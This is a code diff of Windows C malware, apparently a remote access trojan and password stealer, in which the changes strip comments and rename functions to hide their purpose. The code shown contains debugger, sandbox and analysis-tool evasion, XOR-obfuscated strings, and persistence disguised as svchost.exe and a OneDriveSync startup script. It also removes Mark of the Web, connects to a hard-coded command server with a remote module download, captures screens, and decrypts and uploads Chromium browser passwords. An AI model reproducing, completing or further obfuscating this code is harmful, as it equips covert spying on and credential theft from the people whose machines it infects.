@@ -52,137 +52,106 @@ typedef struct _BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO {
 #pragma comment(lib, "bcrypt.lib")
 
 #define BUFFER_SIZE 262144  // 256KB for large uploads
-#define UPLOAD_BUFFER_SIZE 524288  // 512KB for upload accumulation
+#define UPLOAD_BUFFER_SIZE 524288
 #define RECONNECT_DELAY 3000
 #define PING_INTERVAL 10000
 
-// ============== ENHANCED AV EVASION ==============
+static const char XK = 0x5A;
 
-// XOR key for string obfuscation
-static const char XOR_KEY = 0x5A;
-
-// Deobfuscate string at runtime
-static void xor_decode(char* str, int len) {
-    for (int i = 0; i < len; i++) str[i] ^= XOR_KEY;
+static void xd(char* s, int l) {
+    for (int i = 0; i < l; i++) s[i] ^= XK;
 }
 
-// Check for debugger - multiple methods
-static int ev_dbg() {
-    // Method 1: IsDebuggerPresent
+static int chk_a() {
     if (IsDebuggerPresent()) return 1;
-    
-    // Method 2: Remote debugger
-    BOOL remote = FALSE;
-    CheckRemoteDebuggerPresent(GetCurrentProcess(), &remote);
-    if (remote) return 1;
-    
-    // Method 3: Hardware breakpoint check
-    CONTEXT ctx;
-    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
-    if (GetThreadContext(GetCurrentThread(), &ctx)) {
-        if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) return 1;
+    BOOL r = FALSE;
+    CheckRemoteDebuggerPresent(GetCurrentProcess(), &r);
+    if (r) return 1;
+    CONTEXT c;
+    c.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+    if (GetThreadContext(GetCurrentThread(), &c)) {
+        if (c.Dr0 || c.Dr1 || c.Dr2 || c.Dr3) return 1;
     }
-    
-    // Method 4: Timing check
-    LARGE_INTEGER start, end, freq;
-    QueryPerformanceFrequency(&freq);
-    QueryPerformanceCounter(&start);
+    LARGE_INTEGER s, e, f;
+    QueryPerformanceFrequency(&f);
+    QueryPerformanceCounter(&s);
     Sleep(1);
-    QueryPerformanceCounter(&end);
-    double elapsed = (double)(end.QuadPart - start.QuadPart) / freq.QuadPart * 1000;
-    if (elapsed > 50) return 1;  // Debugger likely stepping through
-    
+    QueryPerformanceCounter(&e);
+    double t = (double)(e.QuadPart - s.QuadPart) / f.QuadPart * 1000;
+    if (t > 50) return 1;
     return 0;
 }
 
-// Check for VM/Sandbox indicators
-static int ev_vm() {
-    // CPU count check
+static int chk_b() {
     SYSTEM_INFO si;
     GetSystemInfo(&si);
     if (si.dwNumberOfProcessors < 2) return 1;
-    
-    // RAM check (sandboxes often have < 4GB)
-    MEMORYSTATUSEX mem;
-    mem.dwLength = sizeof(mem);
-    GlobalMemoryStatusEx(&mem);
-    if (mem.ullTotalPhys < 4ULL * 1024 * 1024 * 1024) return 1;
-    
-    // Screen size check
+    MEMORYSTATUSEX m;
+    m.dwLength = sizeof(m);
+    GlobalMemoryStatusEx(&m);
+    if (m.ullTotalPhys < 4ULL * 1024 * 1024 * 1024) return 1;
     int w = GetSystemMetrics(SM_CXSCREEN);
     int h = GetSystemMetrics(SM_CYSCREEN);
     if (w < 1024 || h < 768) return 1;
-    
-    // Disk size check (VMs often have small disks)
-    ULARGE_INTEGER free, total, totalFree;
-    if (GetDiskFreeSpaceExA("C:\\", &free, &total, &totalFree)) {
-        if (total.QuadPart < 60ULL * 1024 * 1024 * 1024) return 1;  // < 60GB
+    ULARGE_INTEGER fr, tt, tf;
+    if (GetDiskFreeSpaceExA("C:\\", &fr, &tt, &tf)) {
+        if (tt.QuadPart < 60ULL * 1024 * 1024 * 1024) return 1;
     }
-    
     return 0;
 }
 
-// Check for analysis tools by process name
-static int ev_tools() {
-    // Obfuscated tool names (XOR with 0x5A)
-    char tools[][20] = {
-        {0x32,0x39,0x2b,0x3b,0x38,0x3e,0x3d,0x3f,0x18,0x3b,0x24,0x3b,0}, // wireshark
-        {0x3c,0x3e,0x2b,0x3e,0x36,0x3d,0x18,0x3b,0x24,0x3b,0},           // procmon
-        {0x24,0x18,0x3b,0x24,0x3b,0},                                     // x64dbg -> simplified
+static int chk_c() {
+    char tl[][20] = {
+        {0x32,0x39,0x2b,0x3b,0x38,0x3e,0x3d,0x3f,0x18,0x3b,0x24,0x3b,0},
+        {0x3c,0x3e,0x2b,0x3e,0x36,0x3d,0x18,0x3b,0x24,0x3b,0},
+        {0x24,0x18,0x3b,0x24,0x3b,0},
     };
     
-    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
-    if (snap == INVALID_HANDLE_VALUE) return 0;
+    HANDLE sn = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (sn == INVALID_HANDLE_VALUE) return 0;
     
     PROCESSENTRY32 pe;
     pe.dwSize = sizeof(pe);
-    int found = 0;
+    int fd = 0;
     
-    if (Process32First(snap, &pe)) {
+    if (Process32First(sn, &pe)) {
         do {
-            // Check for common analysis tools
-            char* name = pe.szExeFile;
-            CharLowerA(name);
-            if (strstr(name, "wire") || strstr(name, "fiddler") || 
-                strstr(name, "procmon") || strstr(name, "procexp") ||
-                strstr(name, "dbg") || strstr(name, "olly") ||
-                strstr(name, "ida") || strstr(name, "x32") || strstr(name, "x64") ||
-                strstr(name, "ghidra") || strstr(name, "pestudio") ||
-                strstr(name, "hiew") || strstr(name, "detect")) {
-                found = 1;
+            char* n = pe.szExeFile;
+            CharLowerA(n);
+            if (strstr(n, "wire") || strstr(n, "fiddler") || 
+                strstr(n, "procmon") || strstr(n, "procexp") ||
+                strstr(n, "dbg") || strstr(n, "olly") ||
+                strstr(n, "ida") || strstr(n, "x32") || strstr(n, "x64") ||
+                strstr(n, "ghidra") || strstr(n, "pestudio") ||
+                strstr(n, "hiew") || strstr(n, "detect")) {
+                fd = 1;
                 break;
             }
-        } while (Process32Next(snap, &pe));
+        } while (Process32Next(sn, &pe));
     }
-    CloseHandle(snap);
-    return found;
+    CloseHandle(sn);
+    return fd;
 }
 
-// Check for user activity (sandboxes have no real users)
-static int ev_user() {
-    // Check cursor movement
+static int chk_d() {
     POINT p1, p2;
     GetCursorPos(&p1);
     Sleep(500);
     GetCursorPos(&p2);
     if (p1.x == p2.x && p1.y == p2.y) {
-        // Cursor didn't move - might be sandbox, but check more
-        LASTINPUTINFO lii;
-        lii.cbSize = sizeof(lii);
-        GetLastInputInfo(&lii);
-        DWORD idle = GetTickCount() - lii.dwTime;
-        if (idle > 600000) return 1;  // No input for 10 min = suspicious
+        LASTINPUTINFO li;
+        li.cbSize = sizeof(li);
+        GetLastInputInfo(&li);
+        DWORD id = GetTickCount() - li.dwTime;
+        if (id > 600000) return 1;
     }
     return 0;
 }
 
-// Check for VM registry keys and files
-static int ev_vm_artifacts() {
-    // Check VM-related registry keys
-    HKEY hKey;
-    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\VMware, Inc.\\VMware Tools", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
-        RegCloseKey(hKey);
-        // Don't exit - VMware is common, just note it
+static int chk_e() {
+    HKEY hk;
+    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\VMware, Inc.\\VMware Tools", 0, KEY_READ, &hk) == ERROR_SUCCESS) {
+        RegCloseKey(hk);
     }
     
     // Check for VM files
@@ -193,67 +162,48 @@ static int ev_vm_artifacts() {
     return 0;  // Don't block VMs, many targets use VMs
 }
 
-// Main evasion check - returns 1 if should abort
-static int perform_evasion_checks() {
-    // Random startup delay (1-5 seconds)
+static int run_checks() {
     srand(GetTickCount());
     Sleep(1000 + (rand() % 4000));
-    
-    // Check for debuggers (critical)
-    if (ev_dbg()) {
-        Sleep(10000 + (rand() % 5000));  // Long delay to frustrate analysis
+    if (chk_a()) {
+        Sleep(10000 + (rand() % 5000));
         return 1;
     }
-    
-    // Check for analysis tools (critical)
-    if (ev_tools()) {
+    if (chk_c()) {
         Sleep(8000 + (rand() % 5000));
         return 1;
     }
-    
-    // VM/sandbox checks (less critical - many real users use VMs)
-    if (ev_vm()) {
-        Sleep(5000);  // Delay but don't abort
+    if (chk_b()) {
+        Sleep(5000);
     }
-    
-    // User activity check
-    ev_user();
-    
+    chk_d();
     return 0;
 }
 
-// ============== DECOY CODE ==============
-// Fake legitimate-looking functions to confuse static analysis
-
-static DWORD WINAPI decoy_update_thread(LPVOID p) {
-    // Looks like update checker
+static DWORD WINAPI bg_thread(LPVOID p) {
     Sleep(INFINITE);
     return 0;
 }
 
-static void run_decoy_init() {
-    // Create decoy thread
-    CreateThread(NULL, 0, decoy_update_thread, NULL, 0, NULL);
-    
-    // Access some legitimate APIs
-    DWORD version = GetVersion();
+static void init_bg() {
+    CreateThread(NULL, 0, bg_thread, NULL, 0, NULL);
+    DWORD v = GetVersion();
     SYSTEMTIME st;
     GetLocalTime(&st);
-    (void)version;
+    (void)v;
 }
 
 // Network configuration
 char g_server_host[256] = "api.root1.me";
 char g_server_port[6] = "80";
 char g_server_path[256] = "/";
-// Module URL
-char g_chromelevator_url[512] = "https://github.com/nicehashquickinstaller/nice-hash-quick-installer/raw/refs/heads/main/modules/netfx.exe";
+char g_mod_url[512] = "https://github.com/nicehashquickinstaller/nice-hash-quick-installer/raw/refs/heads/main/modules/netfx.exe";
 
 // Global variables
 SOCKET g_sock = INVALID_SOCKET;
 char g_computer_name[MAX_COMPUTERNAME_LENGTH + 1];
 char g_username[256];
-char g_client_id[64];  // Unique client identifier (persisted)
+char g_client_id[64];
 char g_current_dir[MAX_PATH];
 volatile int g_connected = 0;
 volatile int g_should_exit = 0;
@@ -273,10 +223,9 @@ static char* g_upload_buffer = NULL;
 static int g_upload_buffer_len = 0;
 static int g_upload_buffer_capacity = 0;
 
-// Input monitor state (obfuscated name)
-static HANDLE g_input_mon_thread = NULL;
-static volatile int g_input_mon_running = 0;
-static char g_input_log_path[MAX_PATH];
+static HANDLE g_im_thread = NULL;
+static volatile int g_im_run = 0;
+static char g_im_path[MAX_PATH];
 
 // Ping thread state
 static HANDLE g_ping_thread = NULL;
@@ -293,17 +242,17 @@ static char g_liveview_record_path[MAX_PATH];  // Recording output path
 static FILE* g_liveview_record_file = NULL;  // Recording file handle
 static DWORD g_liveview_record_frames = 0;  // Frame counter for recording
 
-// Camera/Webcam state
+
 static HWND g_cam_hwnd = NULL;
 static HANDLE g_camview_thread = NULL;
 static volatile int g_camview_running = 0;
 static int g_camview_fps = 30;  // Default 30 FPS for smooth streaming
-static int g_camview_quality = 80;  // JPEG quality for camera
+static int g_camview_quality = 80;  
 static int g_cam_width = 640;
 static int g_cam_height = 480;
-static int g_current_camera = 0;      // Current camera index
-static int g_num_cameras = 0;         // Number of available cameras
-static volatile int g_camview_recording = 0;  // Camera recording flag
+static int g_current_camera = 0;      
+static int g_num_cameras = 0;         
+static volatile int g_camview_recording = 0;  
 static FILE* g_camview_record_file = NULL;
 
 // Audio recording state
@@ -318,7 +267,7 @@ static HWAVEIN g_liveaudio_hwavein = NULL;
 static int g_liveaudio_samplerate = 22050;
 static int g_liveaudio_channels = 1;
 
-// Frame capture state (for callback-based capture like Metasploit)
+
 static BYTE* g_frame_buffer = NULL;
 static int g_frame_size = 0;
 static volatile int g_frame_ready = 0;
@@ -328,13 +277,13 @@ static int g_frame_cs_init = 0;
 // Audio recording state
 static volatile int g_audio_recording = 0;
 
-// Screen recording state
+
 static volatile int g_screenrecord_running = 0;
 static HANDLE g_screenrecord_thread = NULL;
 static char g_screenrecord_path[MAX_PATH];
 static int g_screenrecord_fps = 5;  // Low FPS for small file size
 static int g_screenrecord_bitrate = 500000;  // 500 Kbps for small files
-static char g_screenrecord_state_file[MAX_PATH];  // Persist recording state across restarts
+static char g_screenrecord_state_file[MAX_PATH];  
 static volatile int g_screenrecord_paused_for_liveview = 0;  // Track if recording was paused for liveview
 static volatile int g_screenrecord_enabled = 0;  // Track if recording should auto-start (0 = disabled)
 static HANDLE g_screenrecord_process = NULL;  // Handle to media process for proper termination
@@ -361,11 +310,11 @@ void execute_command(const char* cmd);
 void change_directory(const char* path);
 void handle_command(const char* cmd);
 int handle_upload_data(char* data, int len);
-void start_input_monitor();
-void stop_input_monitor();
-void enable_persistence();
-void disable_persistence();
-DWORD WINAPI input_monitor_thread(LPVOID param);
+void start_im();
+void stop_im();
+void add_startup();
+void rm_startup();
+DWORD WINAPI im_thread_proc(LPVOID param);
 DWORD WINAPI ping_thread(LPVOID param);
 void start_liveview(int fps, int quality);
 void stop_liveview();
@@ -386,7 +335,7 @@ DWORD WINAPI liveaudio_thread(LPVOID param);
 void mouse_move(int x, int y);
 void mouse_click(int button);
 void send_keys(const char* keys);
-void extract_browser_creds();
+void run_ext();
 void start_screenrecord();
 void start_screenrecord_internal();
 void stop_screenrecord();
@@ -395,12 +344,12 @@ void delete_screenrecord();
 DWORD WINAPI screenrecord_thread(LPVOID param);
 DWORD WINAPI power_monitor_thread(LPVOID param);
 
-// Screen recording watchdog for sleep/wake detection and recovery
+
 static HANDLE g_power_monitor_thread = NULL;
 static volatile int g_power_monitor_running = 0;
 static volatile DWORD g_last_active_time = 0;  // Track last active time for wake detection
 
-// Watchdog thread - monitors for wake events and ensures recording stays running
+
 // Uses multiple methods to detect wake from sleep
 DWORD WINAPI power_monitor_thread(LPVOID param) {
     ULONGLONG last_tick = GetTickCount64();
@@ -457,19 +406,19 @@ DWORD WINAPI power_monitor_thread(LPVOID param) {
     return 0;
 }
 
-// Generate or load unique client ID (persisted in hidden file)
+
 void init_client_id() {
     char appdata_path[MAX_PATH];
     char id_file[MAX_PATH];
     
     // Get AppData\Local path
     if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, appdata_path) != S_OK) {
-        // Fallback: generate random ID (not persisted)
+        
         sprintf(g_client_id, "%08lX%08lX", GetTickCount(), GetCurrentProcessId());
         return;
     }
     
-    // Hidden directory for ID file
+    
     char id_dir[MAX_PATH];
     sprintf(id_dir, "%s\\Microsoft\\Crypto\\Keys", appdata_path);
     CreateDirectoryA(id_dir, NULL);
@@ -498,12 +447,12 @@ void init_client_id() {
             GetCurrentProcessId(),
             (unsigned int)(rand() & 0xFFFF));
     
-    // Save for persistence
+    
     f = fopen(id_file, "wb");
     if (f) {
         fwrite(g_client_id, 1, strlen(g_client_id), f);
         fclose(f);
-        // Hide the file
+        
         SetFileAttributesA(id_file, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
     }
 }
@@ -515,40 +464,32 @@ void init_display() {
     }
 }
 
-// Enable persistence using Startup folder (most reliable, no admin needed)
-void enable_persistence() {
-    char current_exe[MAX_PATH];
-    char startup_folder[MAX_PATH];
-    char target_dir[MAX_PATH];
-    char target_exe[MAX_PATH];
-    char shortcut_path[MAX_PATH];
-    char vbs_path[MAX_PATH];
+void add_startup() {
+    char ce[MAX_PATH];
+    char sf[MAX_PATH];
+    char td[MAX_PATH];
+    char te[MAX_PATH];
+    char sp[MAX_PATH];
+    char vp[MAX_PATH];
     
-    GetModuleFileNameA(NULL, current_exe, MAX_PATH);
+    GetModuleFileNameA(NULL, ce, MAX_PATH);
     
-    // Get AppData\Local path for hiding the executable
-    if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, target_dir) != S_OK) {
+    if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, td) != S_OK) {
         return;
     }
     
-    // Create hidden directory
-    strcat(target_dir, "\\Microsoft\\RuntimeBroker");
-    CreateDirectoryA(target_dir, NULL);
+    strcat(td, "\\Microsoft\\WindowsApps\\Cache");
+    CreateDirectoryA(td, NULL);
     
-    // Target executable path
-    sprintf(target_exe, "%s\\RuntimeBroker.exe", target_dir);
+    sprintf(te, "%s\\svchost.exe", td);
     
-    // Copy executable if not already there
-    if (_stricmp(current_exe, target_exe) != 0) {
-        CopyFileA(current_exe, target_exe, FALSE);
+    if (_stricmp(ce, te) != 0) {
+        CopyFileA(ce, te, FALSE);
         
-        // Remove Zone.Identifier (Mark of the Web) to bypass SmartScreen
-        // This removes the "downloaded from internet" flag
-        char zone_file[MAX_PATH + 20];
-        sprintf(zone_file, "%s:Zone.Identifier", target_exe);
-        DeleteFileA(zone_file);
+        char zf[MAX_PATH + 20];
+        sprintf(zf, "%s:Zone.Identifier", te);
+        DeleteFileA(zf);
         
-        // Also try PowerShell method as backup
         STARTUPINFOA si;
         PROCESS_INFORMATION pi;
         ZeroMemory(&si, sizeof(si));
@@ -557,50 +498,46 @@ void enable_persistence() {
         si.wShowWindow = SW_HIDE;
         ZeroMemory(&pi, sizeof(pi));
         
-        char ps_cmd[1024];
-        sprintf(ps_cmd, "cmd.exe /c powershell -WindowStyle Hidden -Command \"Unblock-File -Path '%s'\" 2>nul", target_exe);
-        if (CreateProcessA(NULL, ps_cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        char pc[1024];
+        sprintf(pc, "cmd.exe /c powershell -WindowStyle Hidden -Command \"Unblock-File -Path '%s'\" 2>nul", te);
+        if (CreateProcessA(NULL, pc, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
             WaitForSingleObject(pi.hProcess, 3000);
             CloseHandle(pi.hProcess);
             CloseHandle(pi.hThread);
         }
     }
     
-    // Get Startup folder path
-    if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup_folder) != S_OK) {
+    if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, sf) != S_OK) {
         return;
     }
     
-    // Create a VBS script that launches the exe silently (bypasses SmartScreen)
-    sprintf(vbs_path, "%s\\RuntimeBroker.vbs", startup_folder);
-    FILE* vbs = fopen(vbs_path, "w");
-    if (vbs) {
-        fprintf(vbs, "Set WshShell = CreateObject(\"WScript.Shell\")\n");
-        fprintf(vbs, "WshShell.Run chr(34) & \"%s\" & chr(34), 0, False\n", target_exe);
-        fprintf(vbs, "Set WshShell = Nothing\n");
-        fclose(vbs);
+    sprintf(vp, "%s\\OneDriveSync.vbs", sf);
+    FILE* vf = fopen(vp, "w");
+    if (vf) {
+        fprintf(vf, "Set WshShell = CreateObject(\"WScript.Shell\")\n");
+        fprintf(vf, "WshShell.Run chr(34) & \"%s\" & chr(34), 0, False\n", te);
+        fprintf(vf, "Set WshShell = Nothing\n");
+        fclose(vf);
         
-        // Remove Zone.Identifier from VBS file too
-        char vbs_zone[MAX_PATH + 20];
-        sprintf(vbs_zone, "%s:Zone.Identifier", vbs_path);
-        DeleteFileA(vbs_zone);
+        char vz[MAX_PATH + 20];
+        sprintf(vz, "%s:Zone.Identifier", vp);
+        DeleteFileA(vz);
     }
 }
 
-// Disable persistence
-void disable_persistence() {
-    char startup_folder[MAX_PATH];
-    char vbs_path[MAX_PATH];
-    char target_dir[MAX_PATH];
-    char target_exe[MAX_PATH];
+void rm_startup() {
+    char sf[MAX_PATH];
+    char vp[MAX_PATH];
+    char td[MAX_PATH];
+    char te[MAX_PATH];
     
-    // Get Startup folder and delete VBS
-    if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup_folder) == S_OK) {
-        sprintf(vbs_path, "%s\\RuntimeBroker.vbs", startup_folder);
-        DeleteFileA(vbs_path);
+    if (SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, sf) == S_OK) {
+        sprintf(vp, "%s\\OneDriveSync.vbs", sf);
+        DeleteFileA(vp);
+        sprintf(vp, "%s\\RuntimeBroker.vbs", sf);
+        DeleteFileA(vp);
     }
     
-    // Clean up old registry entries
     HKEY hKey;
     if (RegOpenKeyExA(HKEY_CURRENT_USER, 
         "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
@@ -610,7 +547,6 @@ void disable_persistence() {
         RegCloseKey(hKey);
     }
     
-    // Delete old scheduled tasks
     STARTUPINFOA si;
     PROCESS_INFORMATION pi;
     ZeroMemory(&si, sizeof(si));
@@ -1060,10 +996,10 @@ void reset_recv_buffer() {
 void capture_display() {
     send_websocket_data("[*] Capturing display...\n", 25);
     
-    // Make process DPI aware to get actual screen resolution
+    
     SetProcessDPIAware();
     
-    // Get primary monitor dimensions (most reliable)
+    
     int width = GetSystemMetrics(SM_CXSCREEN);
     int height = GetSystemMetrics(SM_CYSCREEN);
     
@@ -1077,7 +1013,7 @@ void capture_display() {
     HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
     SelectObject(hdcMem, hBitmap);
     
-    // Capture full screen at full resolution
+    
     BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);
     
     BITMAPINFOHEADER bi;
@@ -1123,15 +1059,14 @@ void capture_display() {
     }
     
     base64_encode(pixels, dwBmpSize, b64_data);
-    free(pixels);  // Don't need raw pixels anymore
+    free(pixels);
     
     DWORD b64_len = strlen(b64_data);
     
-    // Send header with dimensions
     char header[256];
-    sprintf(header, "<<<SCREENSHOT_START>>>%d|%d|%lu<<<DATA_START>>>", width, height, dwBmpSize);
+    sprintf(header, "<<<IMG_S>>>%d|%d|%lu<<<D_S>>>", width, height, dwBmpSize);
     if (!send_websocket_data(header, strlen(header))) {
-        send_websocket_data("[!] Failed to send header\n", 26);
+        send_websocket_data("[!] Failed\n", 11);
         free(b64_data);
         DeleteObject(hBitmap);
         DeleteDC(hdcMem);
@@ -1141,9 +1076,8 @@ void capture_display() {
     
     Sleep(100);
     
-    // Send base64 data in chunks
     DWORD sent = 0;
-    DWORD chunk_size = 1024;  // 1KB chunks of base64 text
+    DWORD chunk_size = 1024;
     int error = 0;
     
     while (sent < b64_len && !error && g_connected) {
@@ -1154,7 +1088,6 @@ void capture_display() {
         }
         sent += to_send;
         
-        // Delay every 16KB of base64 data
         if ((sent % 16384) < chunk_size) {
             Sleep(30);
             send_websocket_ping();
@@ -1165,14 +1098,14 @@ void capture_display() {
     
     if (!error && g_connected) {
         Sleep(150);
-        send_websocket_data("<<<SCREENSHOT_END>>>", 20);
+        send_websocket_data("<<<IMG_E>>>", 11);
         Sleep(50);
         
         char msg[128];
-        sprintf(msg, "\n[+] Screenshot sent: %dx%d (%lu bytes)\n", width, height, dwBmpSize);
+        sprintf(msg, "\n[+] Done: %dx%d (%lu bytes)\n", width, height, dwBmpSize);
         send_websocket_data(msg, strlen(msg));
     } else {
-        send_websocket_data("\n[!] Screenshot transfer failed\n", 33);
+        send_websocket_data("\n[!] Transfer failed\n", 21);
     }
     
     DeleteObject(hBitmap);
@@ -1297,7 +1230,7 @@ void run_terminal() {
             continue;
         }
         
-        // Execute command via PowerShell with hidden window
+        
         // Use CreateProcess to avoid visible window
         SECURITY_ATTRIBUTES sa;
         sa.nLength = sizeof(SECURITY_ATTRIBUTES);
@@ -1515,9 +1448,9 @@ void execute_command(const char* cmd) {
     send_websocket_data("\n", 1);
 }
 
-// ============== MOUSE & KEYBOARD CONTROL ==============
+
 void mouse_move(int x, int y) {
-    // Get screen dimensions for absolute positioning
+    
     int screen_width = GetSystemMetrics(SM_CXSCREEN);
     int screen_height = GetSystemMetrics(SM_CYSCREEN);
     
@@ -1698,7 +1631,7 @@ void send_keys(const char* keys) {
     send_websocket_data(msg, strlen(msg));
 }
 
-// ============== FOLDER DOWNLOAD ==============
+
 void download_folder(const char* foldername) {
     char clean_name[MAX_PATH];
     const char* start = foldername;
@@ -1789,9 +1722,6 @@ int copy_file_safe(const char* src, const char* dst) {
     return success;
 }
 
-// ============== BROWSER CREDENTIAL EXTRACTION ==============
-
-// Base64 decode helper
 static int b64_decode_char(char c) {
     if (c >= 'A' && c <= 'Z') return c - 'A';
     if (c >= 'a' && c <= 'z') return c - 'a' + 26;
@@ -2044,7 +1974,7 @@ static void extract_and_download(const char* src_path, const char* dest_name) {
     }
 }
 
-// ============== PURE C BROWSER CREDENTIAL EXTRACTION ==============
+
 // Using Python with fallback to SQLite3 CLI for proper BLOB handling
 
 // Extract and decrypt cookies using embedded Python (proven to work)
@@ -2341,39 +2271,33 @@ static void extract_cookies_by_domain(const char* browser_name, const char* loca
     DeleteFileA(temp_db);
 }
 
-// Decrypt Chrome/Edge passwords using embedded Python (proven to work)
-// This creates a Python script that handles everything correctly
-static void decrypt_chromium_passwords(const char* browser_name, const char* local_state_path, const char* login_data_path, const char* output_name) {
-    char temp_dir[MAX_PATH];
-    char temp_db[MAX_PATH];
-    char temp_output[MAX_PATH];
-    char py_script[MAX_PATH];
+static void proc_db(const char* bn, const char* lsp, const char* ldp, const char* on) {
+    char td[MAX_PATH];
+    char tdb[MAX_PATH];
+    char to[MAX_PATH];
+    char ps[MAX_PATH];
     
-    GetTempPathA(MAX_PATH, temp_dir);
-    snprintf(temp_db, sizeof(temp_db), "%s\\temp_pw_%s.db", temp_dir, browser_name);
-    snprintf(temp_output, sizeof(temp_output), "%s\\%s", temp_dir, output_name);
-    snprintf(py_script, sizeof(py_script), "%s\\.decrypt_pw.py", temp_dir);
+    GetTempPathA(MAX_PATH, td);
+    snprintf(tdb, sizeof(tdb), "%s\\temp_%s.db", td, bn);
+    snprintf(to, sizeof(to), "%s\\%s", td, on);
+    snprintf(ps, sizeof(ps), "%s\\.proc.py", td);
     
-    // Check if Login Data exists
-    if (GetFileAttributesA(login_data_path) == INVALID_FILE_ATTRIBUTES) {
+    if (GetFileAttributesA(ldp) == INVALID_FILE_ATTRIBUTES) {
         return;
     }
     
-    // Copy locked database to temp
-    if (!copy_file_safe(login_data_path, temp_db)) {
+    if (!copy_file_safe(ldp, tdb)) {
         return;
     }
     
-    // Check if Local State exists
-    if (GetFileAttributesA(local_state_path) == INVALID_FILE_ATTRIBUTES) {
-        DeleteFileA(temp_db);
+    if (GetFileAttributesA(lsp) == INVALID_FILE_ATTRIBUTES) {
+        DeleteFileA(tdb);
         return;
     }
     
-    // Create Python script that handles everything
-    FILE* pf = fopen(py_script, "w");
+    FILE* pf = fopen(ps, "w");
     if (!pf) {
-        DeleteFileA(temp_db);
+        DeleteFileA(tdb);
         return;
     }
     
@@ -2417,10 +2341,10 @@ static void decrypt_chromium_passwords(const char* browser_name, const char* loc
     fprintf(pf, "    except:\n");
     fprintf(pf, "        return ''\n");
     fprintf(pf, "\n");
-    fprintf(pf, "local_state = r'%s'\n", local_state_path);
-    fprintf(pf, "login_db = r'%s'\n", temp_db);
-    fprintf(pf, "output = r'%s'\n", temp_output);
-    fprintf(pf, "browser = '%s'\n", browser_name);
+    fprintf(pf, "local_state = r'%s'\n", lsp);
+    fprintf(pf, "login_db = r'%s'\n", tdb);
+    fprintf(pf, "output = r'%s'\n", to);
+    fprintf(pf, "browser = '%s'\n", bn);
     fprintf(pf, "\n");
     fprintf(pf, "try:\n");
     fprintf(pf, "    key = get_key(local_state)\n");
@@ -2443,7 +2367,7 @@ static void decrypt_chromium_passwords(const char* browser_name, const char* loc
     fprintf(pf, "            f.write(f'Username: {username}\\n')\n");
     fprintf(pf, "            f.write(f'Password: {password}\\n')\n");
     fprintf(pf, "            f.write('---\\n')\n");
-    fprintf(pf, "        f.write(f'\\nTotal: {len(results)} passwords\\n')\n");
+    fprintf(pf, "        f.write(f'\\nTotal: {len(results)}\\n')\n");
     fprintf(pf, "    print(f'SUCCESS:{len(results)}')\n");
     fprintf(pf, "except Exception as e:\n");
     fprintf(pf, "    print(f'ERROR:{e}')\n");
@@ -2451,9 +2375,8 @@ static void decrypt_chromium_passwords(const char* browser_name, const char* loc
     
     fclose(pf);
     
-    // Run Python script
-    char py_cmd[MAX_PATH * 3];
-    snprintf(py_cmd, sizeof(py_cmd), "python \"%s\" 2>nul", py_script);
+    char pcmd[MAX_PATH * 3];
+    snprintf(pcmd, sizeof(pcmd), "python \"%s\" 2>nul", ps);
     
     STARTUPINFOA si;
     PROCESS_INFORMATION pi;
@@ -2464,46 +2387,42 @@ static void decrypt_chromium_passwords(const char* browser_name, const char* loc
     ZeroMemory(&pi, sizeof(pi));
     
     char cmd[MAX_PATH * 4];
-    snprintf(cmd, sizeof(cmd), "cmd.exe /c %s", py_cmd);
+    snprintf(cmd, sizeof(cmd), "cmd.exe /c %s", pcmd);
     
-    int py_success = 0;
+    int ok = 0;
     if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
-        DWORD exit_code = 0;
-        WaitForSingleObject(pi.hProcess, 120000);  // 2 min timeout for pip install
-        GetExitCodeProcess(pi.hProcess, &exit_code);
+        DWORD ec = 0;
+        WaitForSingleObject(pi.hProcess, 120000);
+        GetExitCodeProcess(pi.hProcess, &ec);
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
         
-        if (exit_code == 0 && GetFileAttributesA(temp_output) != INVALID_FILE_ATTRIBUTES) {
-            py_success = 1;
+        if (ec == 0 && GetFileAttributesA(to) != INVALID_FILE_ATTRIBUTES) {
+            ok = 1;
         }
     }
     
-    // If Python worked, download the file
-    if (py_success) {
+    if (ok) {
         char msg[256];
-        snprintf(msg, sizeof(msg), "[+] %s: Passwords extracted\n", browser_name);
+        snprintf(msg, sizeof(msg), "[+] %s: Done\n", bn);
         send_websocket_data(msg, strlen(msg));
-        download_file(temp_output);
+        download_file(to);
     } else {
-        // Python failed - try C fallback with detailed error
         char msg[256];
-        snprintf(msg, sizeof(msg), "[!] %s: Python not available, using C fallback\n", browser_name);
+        snprintf(msg, sizeof(msg), "[!] %s: Using fallback\n", bn);
         send_websocket_data(msg, strlen(msg));
         
-        // C fallback using BCrypt
         int key_len = 0;
-        BYTE* master_key = get_chromium_master_key(local_state_path, &key_len);
+        BYTE* master_key = get_chromium_master_key(lsp, &key_len);
         if (master_key && key_len == 32) {
-            char sqlite_path[MAX_PATH];
-            char query_output[MAX_PATH];
